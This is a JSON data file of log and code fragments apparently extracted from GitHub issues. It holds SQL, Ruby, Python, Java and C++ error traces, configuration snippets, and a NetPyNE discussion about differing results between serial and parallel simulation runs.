[
    {
        "logs": "`\nTinyTds::Error: Incorrect syntax near '.'.: CREATE UNIQUE INDEX [dbo].[Wdb_unique_schema_migrations] ON [dbo].[Wdb_schema_migrations] ([version])\n"
    },
    {
        "logs": "```\nTinyTds::Error: Incorrect syntax near '.'.: CREATE UNIQUE INDEX [dbo].[Wdb_unique_schema_migrations] ON [dbo].[Wdb_schema_migrations] ([version])\n"
    },
    {
        "logs": "`path': no implicit conversion of nil into String (TypeError)\r\n        from C:/tools/ruby23/lib/ruby/2.3.0/fileutils.rb:1564:in "
    },
    {
        "logs": "`scala\r\n    // temporary workaround for https://github.com/playframework/Play20/issues/903\r\n    // this breaks automatic reloading for changes in the routers but is still better than to reload at each request\r\n    playMonitoredFiles <<= playMonitoredFiles map { (files: Seq[String]) =>\r\n      files.filterNot(file => file.contains(\"src_managed\"))\r\n    }\r\n"
    },
    {
        "logs": "```scala\r\n    // temporary workaround for https://github.com/playframework/Play20/issues/903\r\n    // this breaks automatic reloading for changes in the routers but is still better than to reload at each request\r\n    playMonitoredFiles <<= playMonitoredFiles map { (files: Seq[String]) =>\r\n      files.filterNot(file => file.contains(\"src_managed\"))\r\n    }\r\n"
    },
    {
        "logs": "`\n<issue_comment>username_1: @username_0 - ok fixed small bug when distributing cells of cellList and works ok now -- let me know; and thanks for finding bug\n<issue_comment>username_0: @username_1, great, thanks. That works for me locally too. \r\n\r\nNow another minor problem.. Simulations in NML2 using just chemical synapses used to produce identical behaviour when run in serial and parallel mode the first time I updated for the Random123 usage, now there are small differences.\r\n\r\nCode is here https://github.com/OpenSourceBrain/NetPyNEShowcase/blob/master/NetPyNE/test/LEMS_SpikingNet_netpyne.py.\r\n\r\nThese are first trace from Sim_SpikingNet.pop_post.v.dat that's produced (cell 0 in post syn cell), run with 1,2,4 processors:\r\n\r\n![selection_296](https://user-images.githubusercontent.com/1556687/27220240-614aa9b6-527c-11e7-9584-70d384e6207b.png)\r\n\r\nclose up:\r\n\r\n![selection_294](https://user-images.githubusercontent.com/1556687/27220249-67b252e0-527c-11e7-984f-b3d73393b427.png)\r\n\r\nPresynaptic cells seem to be identical\n<issue_comment>username_1: @username_0 - ok, took a while but figured what the issue is, although not sure exactly how to solve it:\r\n\r\n- problem is the poissonFiringSyns are stochastic so require an associated h.Random -- otherwise output is different (which is what was happening here).\r\n\r\n- however, in cell.py the h.Random is only created if "
    },
    {
        "logs": "` (https://github.com/Neurosim-lab/netpyne/blob/development/netpyne/neuromlFuncs.py#L1033), which seems like is never met.\r\n\r\n- Also, there seems to be 2 small bugs in https://github.com/Neurosim-lab/netpyne/blob/development/netpyne/cell.py#L1013:\r\n1) self.stims[-1] is accessed before appending the stim (line 1017)\r\n2) ['NeuroML2_stochastic_input_rand'] should start with an 'h' so that it is removed before gathering (otherwise will crash)\r\nBoth of these can easily be fixed by replacing with:\r\n"
    },
    {
        "logs": "` in neuromlFuncs.py to make sure an h.Random was associated to the stim. \r\n\r\nWith the above changes the output was identical when using different num of mpi nodes. However, I didn't commit since wasn't sure exactly how you wanted to handle the 'NeuroML2_stochastic_input' in neuromlFuncs.py\r\n\r\nLet me know if this makes sense and if you need me to make any changes. thx\n<issue_comment>username_0: Thanks for looking into that @username_1. I've made some updates based on your suggestions in https://github.com/Neurosim-lab/netpyne/commit/c9d00f954c22c150f962ff4616f6f57d2a585631, but I think this wasn't really the source of the error, I'm still seeing the small differences myself...\r\n\r\nIt shouldn't have fixed the problem anyway, because the Randoms were already being set up/initialised correctly, since the presynaptic population (receiving the spiking inputs) was identical on 1,2,4 hosts, it was just the slight difference in the post synaptic pop (just receiving syn input from pre pop).\r\n\r\nI'll look into it more and see if I can narrow down where the issue is...\n<issue_comment>username_1: Ah sorry thought we were still looking at SimpleNet, will check SpikingNet.\r\n\r\nHowever, I think the above still does apply to SimpleNet: I pulled your latest changes from neuroml_export and the h.Random for the syn where still not being created, so got different output for 1 vs 2 cores -- does it work ok for you?\n<issue_comment>username_1: Just checked LEMS_SpikingNet and the presyn pops in 1 vs 2 hosts are not identical for me\n<issue_comment>username_1: FYI I was able to reproduce the spkingnet issue with just 2 stims, 2 presyn cells and 1 postsyn cell; I'm implementing the net directly in netpyne (without neuroml export) to check what is causing the discrepancy.\n<issue_comment>username_0: @username_1 thanks! I'll try to get more time to look into this more from my side too this week.\n<issue_comment>username_1: @username_0 - I've been able to reproduce the issue with a minimal example in netpyne, without any neuroml, and using standard hh cells and exp2syn. But after many hours still can't figure out what is the issue. My next step is implementing same thing directly in Neuron.\r\n\r\nThe minimal example is below:\r\n"
    },
    {
        "logs": "`\n<issue_comment>username_0: Thanks for spending some time to look into this @username_1. I'm reasonably sure I was able to run some networks identically in serial and parallel mode before the Random123 refactor, but didn't test it very extensively.\r\n\r\nI'm seeing differences with this example https://github.com/OpenSourceBrain/NetPyNEShowcase/blob/master/NeuroML2/times/LEMS_SpikingNet_netpyne.py between serial and np = 2 (pre pop has 3 cells, post has 2, 2 conns: pre0->post0, pre1-> post1)\r\n\r\n![selection_307](https://user-images.githubusercontent.com/1556687/27865505-b6605046-618a-11e7-99e5-b6cf9ec1d448.png)\r\n![selection_308](https://user-images.githubusercontent.com/1556687/27865524-cd27fc20-618a-11e7-964e-60204c793f7b.png)\r\n\r\n\r\nBut when I remove the 3rd cell in pre pop the difference vanishes...\r\n\r\n![selection_306](https://user-images.githubusercontent.com/1556687/27865530-d5ff5a0a-618a-11e7-96a7-5b987f652687.png)\n<issue_comment>username_1: @username_0 - I tested a bunch of the tutorials and they produce identical output with 1 and 2 cores, even with the new Random123.\r\nAnd yeah, I started from the LEMS_SpikingNet_netpyne.py example, rewrote it in netpyne, and simplified it step by step until I was able to reproduce the issue with a minimal model (just 2 pre and 1 pop cells) that involved no NeuroML, and used standard HH neurons and Exp2syn. \r\nI've pushed the code to the sandbox: https://github.com/Neurosim-lab/netpyne/blob/development/examples/sandbox/sandbox.py\n<issue_comment>username_1: @username_0 - Finally figured it out!!\r\n\r\nSo it turns out that that gid_connect modifies the threshold of the source cell but only if the cell is on the same node. This leads to different outputs if running on 1 vs 2 cores. \r\n\r\nYou can see a minimal example using just Neuron in the sandbox: https://github.com/Neurosim-lab/netpyne/blob/development/examples/sandbox/sandbox.py -- notice the threshold of cell with gid=1 is different if you run on 1 vs 2 cores. \r\n\r\nA related issue was discussed in this forum post: https://www.neuron.yale.edu/phpBB/viewtopic.php?f=31&t=2355. Seems like a possible solution would be to never use the threshold of the postyn cell netcon (via pc.gid_connect) and instead use the one of the presyn cell netcon (via pc.cell). I discussed with Robert, and emailed Mike Hines about it.\r\n\r\nFor now I changed netpyne so the threshold in conns is not used; and so you can provide a 'threshold' param in cellParams eg. "
    },
    {
        "logs": "`\r\nError occurred type=\"error\" text=\"Missing job runner for an existing job - #######\" stackTrace=\"   at Kudu.Core.Jobs.ContinuousJobsManager.EnableJob(String jobName)\r\n   at Kudu.Services.Jobs.JobsController.EnableContinuousJob(String jobName)\r\n   at lambda_method(Closure , Object , Object[] )\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ActionExecutor.<>c__DisplayClass10.<GetExecutor>b__9(Object instance, Object[] methodParameters)\r\n"
    },
    {
        "logs": "`\r\n~/.local/opt/miniconda3/envs/py3/lib/python3.7/site-packages/scipy/optimize/_root.py in root(fun, x0, args, method, jac, tol, callback, options)\r\n    185 \r\n    186     if meth == 'hybr':\r\n--> 187         sol = _root_hybr(fun, x0, args=args, jac=jac, **options)\r\n    188     elif meth == 'lm':\r\n    189         sol = _root_leastsq(fun, x0, args=args, jac=jac, **options)\r\n\r\n~/.local/opt/miniconda3/envs/py3/lib/python3.7/site-packages/scipy/optimize/minpack.py in _root_hybr(func, x0, args, jac, col_deriv, xtol, maxfev, band, eps, factor, diag, **unknown_options)\r\n    223             maxfev = 200 * (n + 1)\r\n    224         retval = _minpack._hybrd(func, x0, args, 1, xtol, maxfev,\r\n--> 225                                  ml, mu, epsfcn, factor, diag)\r\n    226     else:\r\n    227         _check_func('fsolve', 'fprime', Dfun, x0, args, n, (n, n))\r\n\r\nValueError: The array returned by a function changed size between calls\r\n"
    },
    {
        "logs": "```\r\n~/.local/opt/miniconda3/envs/py3/lib/python3.7/site-packages/scipy/optimize/_root.py in root(fun, x0, args, method, jac, tol, callback, options)\r\n    185 \r\n    186     if meth == 'hybr':\r\n--> 187         sol = _root_hybr(fun, x0, args=args, jac=jac, **options)\r\n    188     elif meth == 'lm':\r\n    189         sol = _root_leastsq(fun, x0, args=args, jac=jac, **options)\r\n\r\n~/.local/opt/miniconda3/envs/py3/lib/python3.7/site-packages/scipy/optimize/minpack.py in _root_hybr(func, x0, args, jac, col_deriv, xtol, maxfev, band, eps, factor, diag, **unknown_options)\r\n    223             maxfev = 200 * (n + 1)\r\n    224         retval = _minpack._hybrd(func, x0, args, 1, xtol, maxfev,\r\n--> 225                                  ml, mu, epsfcn, factor, diag)\r\n    226     else:\r\n    227         _check_func('fsolve', 'fprime', Dfun, x0, args, n, (n, n))\r\n\r\nValueError: The array returned by a function changed size between calls\r\n"
    },
    {
        "logs": "`xml\r\n<resource methods=\"POST GET OPTIONS DELETE PUT\"\r\nurl-mapping=\"/*\"\r\nfaultSequence=\"fault\">\r\n<inSequence>\r\n<property name=\"DISABLE_CHUNKING\" value=\"true\" scope=\"axis2\"/>\r\n<cache scope=\"per-host\"\r\ncollector=\"false\"\r\nhashGenerator=\"org.wso2.caching.digest.REQUESTHASHGenerator\"\r\ntimeout=\"10\">\r\n<implementation type=\"memory\" maxSize=\"500\"/>\r\n</cache>\r\n<filter source=\"$ctx:AM_KEY_TYPE\" regex=\"PRODUCTION\">\r\n<then>\r\n<send>\r\n<endpoint name=\"admin--HelloAPI_APIproductionEndpoint_0\">\r\n<http uri-template=\"http://localhost:9765/services/HelloService/\"/>\r\n</endpoint>\r\n</send>\r\n</then>\r\n<else>\r\n<sequence key=\"sandbox_key_error\"/>\r\n</else>\r\n</filter>\r\n</inSequence>\r\n<outSequence>\r\n<cache scope=\"per-host\" collector=\"true\"/>\r\n<send/>\r\n</outSequence>\r\n</resource>\r\n"
    },
    {
        "logs": "`\r\nException\r\n=========\r\nTID: [0] [AM] [2015-01-22 15:56:24,029] INFO\r\n{org.apache.synapse.mediators.builtin.LogMediator} - STATUS = Executing default 'fault' sequence, ERROR_CODE = 0, ERROR_MESSAGE = Content-Type:application/soap+xml;charset=UTF-8;action=\"http://xmlns.fmr.com/WI/DC/2014/06/AAA/AAAService/GetSummary\",Host:apigw-dev1.fmr.com:10243, Unexpected error sending message back {org.apache.synapse.mediators.builtin.LogMediator}\r\nTID: [0] [AM] [2015-01-22 15:56:24,029] INFO\r\n{org.apache.synapse.mediators.builtin.LogMediator}\r\n- Error Details: = org.apache.synapse.SynapseException: Content-Type:application/soap+xml;charset=UTF-8;action=\"http://xmlns.fmr.com/WI/DC/2014/06/Balances/BalancesService/GetSummary\",Host:apigw-dev1.fmr.com:10243, Unexpected error sending message back\r\nat org.apache.synapse.core.axis2.Axis2Sender.handleException(Axis2Sender.java:172)\r\nat org.apache.synapse.core.axis2.Axis2Sender.sendBack(Axis2Sender.java:166)\r\nat org.apache.synapse.mediators.builtin.CacheMediator.processRequestMessage(CacheMediator.java:408)\r\nat org.apache.synapse.mediators.builtin.CacheMediator.mediate(CacheMediator.java:177)\r\nat org.apache.synapse.mediators.AbstractListMediator.mediate(AbstractListMediator.java:77)\r\nat org.apache.synapse.mediators.AbstractListMediator.mediate(AbstractListMediator.java:47)\r\nat org.apache.synapse.mediators.base.SequenceMediator.mediate(SequenceMediator.java:131)\r\nat org.apache.synapse.rest.Resource.process(Resource.java:297)\r\nat org.apache.synapse.rest.API.process(API.java:341)\r\nat org.apache.synapse.rest.RESTRequestHandler.dispatchToAPI(RESTRequestHandler.java:83)\r\nat org.apache.synapse.rest.RESTRequestHandler.process(RESTRequestHandler.java:64)\r\nat org.apache.synapse.core.axis2.Axis2SynapseEnvironment.injectMessage(Axis2SynapseEnvironment.java:220)\r\nat org.apache.synapse.core.axis2.SynapseMessageReceiver.receive(SynapseMessageReceiver.java:83)\r\nat org.apache.axis2.engine.AxisEngine.receive(AxisEngine.java:180)\r\nat org.apache.synapse.transport.passthru.ServerWorker.processEntityEnclosingRequest(ServerWorker.java:411)\r\nat org.apache.synapse.transport.passthru.ServerWorker.run(ServerWorker.java:183)\r\nat org.apache.axis2.transport.base.threads.NativeWorkerPool$1.run(NativeWorkerPool.java:172)\r\nat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)\r\nat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)\r\nat java.lang.Thread.run(Thread.java:745)\r\nCaused by: org.apache.axis2.AxisFault: Failed to submit the response\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.handleException(PassThroughHttpSender.java:550)\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.invoke(PassThroughHttpSender.java:256)\r\nat org.apache.axis2.engine.AxisEngine.send(AxisEngine.java:442)\r\nat org.apache.synapse.core.axis2.Axis2Sender.sendBack(Axis2Sender.java:163)\r\n... 18 more\r\nCaused by: java.lang.UnsupportedOperationException: The parser is already consumed!\r\nat org.apache.axiom.om.impl.llom.OMContainerHelper.getXMLStreamReader(OMContainerHelper.java:58)\r\nat org.apache.axiom.om.impl.llom.OMElementImpl.getXMLStreamReader(OMElementImpl.java:736)\r\nat org.apache.axiom.om.impl.util.OMSerializerUtil.serializeByPullStream(OMSerializerUtil.java:547)\r\nat org.apache.axiom.soap.impl.llom.SOAPEnvelopeImpl.internalSerialize(SOAPEnvelopeImpl.java:249)\r\nat org.apache.axiom.om.impl.llom.OMSerializableImpl.serializeAndConsume(OMSerializableImpl.java:193)\r\nat org.apache.axis2.transport.http.SOAPMessageFormatter.writeTo(SOAPMessageFormatter.java:74)\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.submitResponse(PassThroughHttpSender.java:489)\r\nat org.apache.synapse.transport.passthru.PassThroughHttpSender.invoke(PassThroughHttpSender.java:254)\r\n... 20 more\r\n"
    },
    {
        "logs": "```xml\r\n<resource methods=\"POST GET OPTIONS DELETE PUT\"\r\nurl-mapping=\"/*\"\r\nfaultSequence=\"fault\">\r\n<inSequence>\r\n<property name=\"DISABLE_CHUNKING\" value=\"true\" scope=\"axis2\"/>\r\n<cache scope=\"per-host\"\r\ncollector=\"false\"\r\nhashGenerator=\"org.wso2.caching.digest.REQUESTHASHGenerator\"\r\ntimeout=\"10\">\r\n<implementation type=\"memory\" maxSize=\"500\"/>\r\n</cache>\r\n<filter source=\"$ctx:AM_KEY_TYPE\" regex=\"PRODUCTION\">\r\n<then>\r\n<send>\r\n<endpoint name=\"admin--HelloAPI_APIproductionEndpoint_0\">\r\n<http uri-template=\"http://localhost:9765/services/HelloService/\"/>\r\n</endpoint>\r\n</send>\r\n</then>\r\n<else>\r\n<sequence key=\"sandbox_key_error\"/>\r\n</else>\r\n</filter>\r\n</inSequence>\r\n<outSequence>\r\n<cache scope=\"per-host\" collector=\"true\"/>\r\n<send/>\r\n</outSequence>\r\n</resource>\r\n"
    },
    {
        "logs": "`\r\n    #if defined(__APPLE__)\r\n      error_addr = reinterpret_cast<void *>(uctx->uc_mcontext->__ss.__pc);\r\n    #elif\r\n      error_addr = reinterpret_cast<void *>(uctx->uc_mcontext.pc);\r\n    #endif\r\n"
    },
    {
        "logs": "```\r\n    #if defined(__APPLE__)\r\n      error_addr = reinterpret_cast<void *>(uctx->uc_mcontext->__ss.__pc);\r\n    #elif\r\n      error_addr = reinterpret_cast<void *>(uctx->uc_mcontext.pc);\r\n    #endif\r\n"
    },
    {
        "logs": "`\r\n2021-01-15 11:43:53.770  INFO 84483 --- [mo-topic1-0-C-1] c.e.c.KafaTransactionDLTConfiguration    : In Error handler {}\r\n\r\norg.springframework.kafka.listener.ListenerExecutionFailedException: Listener method 'public void com.example.config.KafaTransactionDLTConfiguration.listen(java.lang.String,int,java.lang.String,org.apache.kafka.clients.consumer.KafkaConsumer<java.lang.String, java.lang.String>,long,long) throws java.lang.Exception' threw exception; nested exception is org.springframework.dao.InvalidDataAccessApiUsageException: Target object must not be null; nested exception is java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.kafka.listener.adapter.MessagingMessageListenerAdapter.invokeHandler(MessagingMessageListenerAdapter.java:350) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.RecordMessagingMessageListenerAdapter.onMessage(RecordMessagingMessageListenerAdapter.java:86) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.RecordMessagingMessageListenerAdapter.onMessage(RecordMessagingMessageListenerAdapter.java:51) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.doInvokeOnMessage(KafkaMessageListenerContainer.java:1880) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeOnMessage(KafkaMessageListenerContainer.java:1862) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.doInvokeRecordListener(KafkaMessageListenerContainer.java:1799) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.access$1900(KafkaMessageListenerContainer.java:432) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer$3.doInTransactionWithoutResult(KafkaMessageListenerContainer.java:1667) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.transaction.support.TransactionCallbackWithoutResult.doInTransaction(TransactionCallbackWithoutResult.java:36) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.support.TransactionTemplate.execute(TransactionTemplate.java:140) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeRecordListenerInTx(KafkaMessageListenerContainer.java:1658) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeRecordListener(KafkaMessageListenerContainer.java:1633) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.invokeListener(KafkaMessageListenerContainer.java:1366) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.pollAndInvoke(KafkaMessageListenerContainer.java:1082) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.KafkaMessageListenerContainer$ListenerConsumer.run(KafkaMessageListenerContainer.java:990) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515) ~[na:na]\r\n\tat java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264) ~[na:na]\r\n\tat java.base/java.lang.Thread.run(Thread.java:832) ~[na:na]\r\nCaused by: org.springframework.dao.InvalidDataAccessApiUsageException: Target object must not be null; nested exception is java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.orm.jpa.EntityManagerFactoryUtils.convertJpaAccessExceptionIfPossible(EntityManagerFactoryUtils.java:374) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.orm.jpa.vendor.HibernateJpaDialect.translateExceptionIfPossible(HibernateJpaDialect.java:257) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.orm.jpa.AbstractEntityManagerFactoryBean.translateExceptionIfPossible(AbstractEntityManagerFactoryBean.java:528) ~[spring-orm-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.ChainedPersistenceExceptionTranslator.translateExceptionIfPossible(ChainedPersistenceExceptionTranslator.java:61) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.DataAccessUtils.translateIfNecessary(DataAccessUtils.java:242) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:153) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.CrudMethodMetadataPostProcessor$CrudMethodMetadataPopulatingMethodInterceptor.invoke(CrudMethodMetadataPostProcessor.java:178) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:212) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat com.sun.proxy.$Proxy81.save(Unknown Source) ~[na:na]\r\n\tat com.example.config.KafaTransactionDLTConfiguration.send(KafaTransactionDLTConfiguration.java:148) ~[classes/:na]\r\n\tat com.example.config.KafaTransactionDLTConfiguration.listen(KafaTransactionDLTConfiguration.java:112) ~[classes/:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:564) ~[na:na]\r\n\tat org.springframework.messaging.handler.invocation.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:171) ~[spring-messaging-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.messaging.handler.invocation.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:120) ~[spring-messaging-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.HandlerAdapter.invoke(HandlerAdapter.java:48) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat org.springframework.kafka.listener.adapter.MessagingMessageListenerAdapter.invokeHandler(MessagingMessageListenerAdapter.java:329) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\t... 17 common frames omitted\r\nCaused by: java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.util.Assert.notNull(Assert.java:201) ~[spring-core-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.setWrappedInstance(AbstractNestablePropertyAccessor.java:195) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.BeanWrapperImpl.setWrappedInstance(BeanWrapperImpl.java:153) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.setWrappedInstance(AbstractNestablePropertyAccessor.java:183) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.AbstractNestablePropertyAccessor.<init>(AbstractNestablePropertyAccessor.java:122) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.beans.BeanWrapperImpl.<init>(BeanWrapperImpl.java:103) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.util.DirectFieldAccessFallbackBeanWrapper.<init>(DirectFieldAccessFallbackBeanWrapper.java:36) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.JpaMetamodelEntityInformation.getId(JpaMetamodelEntityInformation.java:159) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.AbstractEntityInformation.isNew(AbstractEntityInformation.java:42) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.JpaMetamodelEntityInformation.isNew(JpaMetamodelEntityInformation.java:246) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.jpa.repository.support.SimpleJpaRepository.save(SimpleJpaRepository.java:553) ~[spring-data-jpa-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na]\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]\r\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:564) ~[na:na]\r\n\tat org.springframework.data.repository.core.support.ImplementationInvocationMetadata.invoke(ImplementationInvocationMetadata.java:72) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryComposition$RepositoryFragments.invoke(RepositoryComposition.java:382) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryComposition.invoke(RepositoryComposition.java:205) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.RepositoryFactorySupport$ImplementationMethodExecutionInterceptor.invoke(RepositoryFactorySupport.java:549) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.repository.core.support.QueryExecutorMethodInterceptor.doInvoke(QueryExecutorMethodInterceptor.java:155) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.data.repository.core.support.QueryExecutorMethodInterceptor.invoke(QueryExecutorMethodInterceptor.java:130) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor.invoke(DefaultMethodInvokingMethodInterceptor.java:80) ~[spring-data-commons-2.3.3.RELEASE.jar:2.3.3.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:367) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:118) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\tat org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:139) ~[spring-tx-5.2.8.RELEASE.jar:5.2.8.RELEASE]\r\n\t... 34 common frames omitted\r\n"
    },
    {
        "logs": "```\r\n2021-01-15 11:43:53.770  INFO 84483 --- [mo-topic1-0-C-1] c.e.c.KafaTransactionDLTConfiguration    : In Error handler {}\r\n\r\norg.springframework.kafka.listener.ListenerExecutionFailedException: Listener method 'public void com.example.config.KafaTransactionDLTConfiguration.listen(java.lang.String,int,java.lang.String,org.apache.kafka.clients.consumer.KafkaConsumer<java.lang.String, java.lang.String>,long,long) throws java.lang.Exception' threw exception; nested exception is org.springframework.dao.InvalidDataAccessApiUsageException: Target object must not be null; nested exception is java.lang.IllegalArgumentException: Target object must not be null\r\n\tat org.springframework.kafka.listener.adapter.MessagingMessageListenerAdapter.invokeHandler(MessagingMessageListenerAdapter.java:350) ~[spring-kafka-2.5.5.RELEASE.jar:2.5.5.RELEASE]\r\n\tat 